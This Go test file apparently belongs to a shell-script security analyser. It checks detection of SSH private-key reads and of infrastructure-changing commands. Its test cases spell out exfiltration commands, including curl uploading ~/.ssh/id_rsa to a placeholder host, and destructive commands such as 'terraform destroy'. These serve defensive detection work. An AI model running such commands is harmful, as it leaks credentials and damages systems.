package shell_test

import (
	"context"
	"testing"

	"github.com/skarm/scout/internal/analysis/document"
	"github.com/skarm/scout/internal/analysis/languages/shell"
	"github.com/skarm/scout/internal/capture/artifact"
	"github.com/skarm/scout/internal/syntax/source"
)

func TestObserveNetworkRetainsSensitiveFileReads(t *testing.T) {
	for _, tc := range []struct {
		name, text string
		reads      bool
	}{
		{name: "cat", text: `cat ~/.ssh/id_rsa`, reads: true},
		{name: "home-substitution", text: `value=$(cat ~/.ssh/id_rsa)`, reads: true},
		{name: "bound-home-path", text: `file=~/.ssh/id_rsa; cat "$file"`, reads: true},
		{name: "home-redirect", text: `cat < ~/.ssh/id_rsa`, reads: true},
		{name: "substitution", text: `value=$(cat /home/user/.ssh/id_rsa)`, reads: true},
		{name: "bound-path", text: `file=/home/user/.ssh/id_rsa; cat "$file"`, reads: true},
		{name: "redirect", text: `cat < /home/user/.ssh/id_rsa`, reads: true},
		{name: "curl-body", text: `curl --data-binary @/home/user/.ssh/id_rsa https://example.invalid`, reads: true},
		{name: "curl-upload", text: `curl --upload-file /home/user/.ssh/id_rsa https://example.invalid`, reads: true},
		{name: "public-file", text: `cat ./notes.txt`},
		{name: "public-home-file", text: `cat ~/notes.txt`},
		{name: "home-suffix", text: `cat ~/.ssh/id_rsa.backup`},
		{name: "home-normalized-public", text: `cat ~/.ssh/id_rsa/../../notes.txt`},
		{name: "literal", text: `printf '%s' 'cat ~/.ssh/id_rsa'`},
		{name: "comment", text: "# cat ~/.ssh/id_rsa\nprintf ready"},
		{name: "write", text: `printf ready > /home/user/.ssh/id_rsa`},
		{name: "help", text: `cat --help /home/user/.ssh/id_rsa`},
		{name: "literal-body", text: `curl --data /home/user/.ssh/id_rsa https://example.invalid`},
		{name: "home-glob", text: `cat ~/*/.ssh/id_rsa`},
		{name: "home-braces", text: `cat ~/{a,b}/.ssh/id_rsa`},
		{name: "home-dynamic", text: `cat ~/$FOLDER/.ssh/id_rsa`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ctx := context.Background()
			doc := document.Prepare(ctx, artifact.NewFile("run.sh", []byte(tc.text), false))
			var reads []source.Span
			err := shell.Observe(ctx, doc, shell.Observers{Secret: func(span source.Span) { reads = append(reads, span) }})
			if err != nil || (len(reads) > 0) != tc.reads {
				t.Fatalf("sensitive file reads=%+v want=%t err=%v", reads, tc.reads, err)
			}
			for _, span := range reads {
				if span.Start < 0 || span.End <= span.Start || span.End > len(tc.text) {
					t.Fatalf("invalid source coordinates: %+v", span)
				}
			}
		})
	}
}

func TestObserveNetworkUnknownHomeRemainsIncomplete(t *testing.T) {
	for _, text := range []string{`unmodeled_step; cat ~/.ssh/id_rsa`, `HOME="$UNMODELED"; cat ~/.ssh/id_rsa`} {
		ctx := context.Background()
		doc := document.Prepare(ctx, artifact.NewFile("run.sh", []byte(text), false))
		if err := shell.Observe(ctx, doc, shell.Observers{Secret: func(source.Span) {}}); err == nil {
			t.Fatalf("unknown HOME silently completed: %s", text)
		}
	}
}

func TestInfrastructureCommandGrammarPreservesOperandRoles(t *testing.T) {
	for _, tc := range []struct {
		text string
		want bool
	}{
		{`/usr/bin/kubectl --namespace=local apply -f config.yaml`, true},
		{`kubectl --kubeconfig config.yaml rollout restart deployment/app`, true},
		{`terraform -chdir=infra destroy`, true},
		{`helm --kube-context local install app ./chart`, true},
		{`docker -H unix:///var/run/docker.sock restart app`, true},
		{`kubectl --context delete get pods`, false},
		{`kubectl --unknown delete pods`, false},
		{`kubectl --context "$UNKNOWN" delete pods`, false},
		{`kubectl rollout status deployment/app`, false},
		{`kubectl apply --help`, false},
		{`kubectl apply --help=true`, false},
		{`kubectl apply --help=false -f config.yaml`, true},
		{`kubectl apply -Rh`, false},
		{`kubectl apply -f --help`, true},
		{`kubectl apply -f --help=true`, true},
		{`kubectl apply -Rf --help`, true},
		{`kubectl apply --filename --dry-run=server`, true},
		{`kubectl apply -f --list`, true},
		{`helm upgrade app ./chart --values --help`, true},
		{`helm upgrade app ./chart --set --dry-run=server`, true},
		{`terraform apply -help`, false},
		{`kubectl label pods --list`, false},
		{`kubectl label pods --list=1`, false},
		{`kubectl label pods --list=TRUE`, false},
		{`kubectl label pods --list=false key=value`, true},
		{`kubectl label --local=TRUE -f config.yaml key=value`, false},
		{`helm upgrade app ./chart --help=1`, false},
		{`helm upgrade -ih app ./chart`, false},
		{`kubectl apply --dry-run=server -f config.yaml`, false},
		{`helm upgrade app ./chart --dry-run`, false},
		{`kubectl apply --dry-run=none -f config.yaml`, true},
		{`terraform state list`, false},
		{`helm list`, false},
		{`docker ps`, false},
		{`docker run --help`, false},
		{`docker run --help=true`, false},
		{`docker run alpine --help=true`, true},
		{`docker run --help=false alpine --help`, true},
		{`docker run alpine --help`, true},
		{`docker run --name app alpine --help`, true},
		{`echo kubectl delete pods`, false},
		{`# kubectl delete pods`, false},
	} {
		t.Run(tc.text, func(t *testing.T) {
			doc := document.Prepare(t.Context(), artifact.NewFile("run.sh", []byte(tc.text), false))
			var spans []source.Span
			err := shell.Observe(t.Context(), doc, shell.Observers{Capability: func(kind string, span source.Span) {
				if kind == "infrastructure_mutation" {
					spans = append(spans, span)
				}
			}})
			if err != nil || (len(spans) > 0) != tc.want {
				t.Fatalf("wrong infrastructure capability: %+v want=%t err=%v", spans, tc.want, err)
			}
			for _, span := range spans {
				if span.Start < 0 || span.End <= span.Start || span.End > len(tc.text) {
					t.Fatalf("invalid capability coordinates: %+v", span)
				}
			}
		})
	}
}
